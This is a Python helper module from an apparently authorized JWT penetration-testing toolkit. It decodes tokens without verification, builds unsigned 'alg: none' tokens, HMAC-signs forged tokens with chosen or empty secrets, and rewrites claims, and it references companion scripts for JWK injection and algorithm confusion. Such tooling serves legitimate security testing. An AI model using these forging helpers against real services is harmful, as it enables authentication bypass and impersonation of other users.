"""
jwt_common.py — shared helpers for the JWT PoC scripts (guide §2).
Standard-library only (base64/json/hmac/hashlib). No signature *verification* here — these
are forging helpers for AUTHORIZED testing. Forge into your own test accounts only (guide §32).
"""
import base64
import json
import hmac
import hashlib


def b64url_encode(data: bytes) -> str:
    """base64url without padding (JWT style)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(s: str) -> bytes:
    """base64url decode, tolerating missing padding."""
    if isinstance(s, bytes):
        s = s.decode("ascii")
    s = s.strip()
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def decode_token(token: str):
    """Return (header_dict, payload_dict, signature_b64) without verifying."""
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("Not a JWT (need at least header.payload).")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


_HASHES = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def sign_hs(signing_input: bytes, secret: bytes, alg: str = "HS256") -> str:
    """HMAC sign and return base64url signature. secret is raw bytes (may be b'')."""
    h = _HASHES.get(alg.upper())
    if h is None:
        raise ValueError(f"Unsupported HMAC alg: {alg}")
    mac = hmac.new(secret, signing_input, h).digest()
    return b64url_encode(mac)


def build_token(header: dict, payload: dict, *, secret: bytes = None, alg: str = None) -> str:
    """
    Build a token. If alg is 'none' (or header.alg is none) -> empty signature.
    If alg is HS256/384/512 -> HMAC sign with `secret` (bytes).
    For RS/ES signing use jwk_inject.py / rs256_to_hs256.py (they use 'cryptography').
    """
    use_alg = (alg or header.get("alg") or "none")
    header = dict(header)
    header["alg"] = use_alg
    seg_h = b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=False).encode())
    seg_p = b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=False).encode())
    signing_input = f"{seg_h}.{seg_p}".encode()

    if use_alg.lower() == "none":
        return f"{seg_h}.{seg_p}."
    if use_alg.upper().startswith("HS"):
        if secret is None:
            secret = b""
        return f"{seg_h}.{seg_p}.{sign_hs(signing_input, secret, use_alg)}"
    raise ValueError(f"build_token only does none/HS*. Use a dedicated script for {use_alg}.")


def apply_claims(payload: dict, claim_args) -> dict:
    """
    Apply --claim key=value overrides. Tries to coerce true/false/null/int/JSON,
    else keeps the raw string. Supports dotted nothing fancy — top-level keys.
    """
    out = dict(payload)
    for c in (claim_args or []):
        if "=" not in c:
            raise ValueError(f"--claim must be key=value, got: {c}")
        k, v = c.split("=", 1)
        out[k] = _coerce(v)
    return out


def _coerce(v: str):
    low = v.lower()
    if low == "true":
        return True
    if low == "false":
        return False
    if low == "null":
        return None
    try:
        return int(v)
    except ValueError:
        pass
    if (v.startswith("{") and v.endswith("}")) or (v.startswith("[") and v.endswith("]")):
        try:
            return json.loads(v)
        except Exception:
            pass
    return v


def pretty(token: str) -> str:
    h, p, _ = decode_token(token)
    return ("HEADER : " + json.dumps(h) + "\n" +
            "PAYLOAD: " + json.dumps(p))
